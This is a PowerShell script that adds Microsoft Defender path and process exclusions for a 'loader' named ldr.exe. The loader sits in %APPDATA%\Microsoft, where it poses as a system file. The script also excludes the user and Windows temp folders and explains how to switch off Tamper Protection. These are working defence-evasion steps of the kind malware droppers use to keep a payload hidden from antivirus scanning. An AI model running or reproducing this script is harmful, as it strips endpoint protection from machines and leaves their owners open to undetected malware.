#requires -RunAsAdministrator
# Add-DefExcl.ps1 — adds Defender exclusions for ldr.exe loader
# Run: powershell -ExecutionPolicy Bypass -File .\Add-DefExcl.ps1

$ErrorActionPreference = 'Continue'

# Verify elevation
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$pr = New-Object Security.Principal.WindowsPrincipal($id)
if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERROR: must run elevated" -ForegroundColor Red
    exit 1
}

# Verify Defender is present
if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
    Write-Host "ERROR: Defender module not available" -ForegroundColor Red
    exit 2
}

# Check Tamper Protection
$tp = (Get-MpComputerStatus).IsTamperProtected
if ($tp) {
    Write-Host "WARN: Tamper Protection is ON. Exclusions will fail." -ForegroundColor Yellow
    Write-Host "Turn off: Windows Security > Virus & threat protection > Manage settings > Tamper Protection" -ForegroundColor Yellow
}

$paths = @(
    "$env:APPDATA\Microsoft",
    "$env:APPDATA\Microsoft\ldr.exe",
    "$env:TEMP",
    "C:\Windows\Temp"
)
$procs = @(
    "$env:APPDATA\Microsoft\ldr.exe"
)

$ok = 0; $fail = 0

foreach ($p in $paths) {
    try {
        Add-MpPreference -ExclusionPath $p -ErrorAction Stop
        Write-Host "[path OK] $p" -ForegroundColor Green
        $ok++
    } catch {
        Write-Host "[path FAIL] $p -> $($_.Exception.Message)" -ForegroundColor Red
        $fail++
    }
}
foreach ($p in $procs) {
    try {
        Add-MpPreference -ExclusionProcess $p -ErrorAction Stop
        Write-Host "[proc OK] $p" -ForegroundColor Green
        $ok++
    } catch {
        Write-Host "[proc FAIL] $p -> $($_.Exception.Message)" -ForegroundColor Red
        $fail++
    }
}

Write-Host "`n=== Result: $ok added, $fail failed ===" -ForegroundColor Cyan

Write-Host "`n=== Current ExclusionPath ===" -ForegroundColor Cyan
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

Write-Host "`n=== Current ExclusionProcess ===" -ForegroundColor Cyan
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess

if ($fail -gt 0) { exit 3 } else { exit 0 }
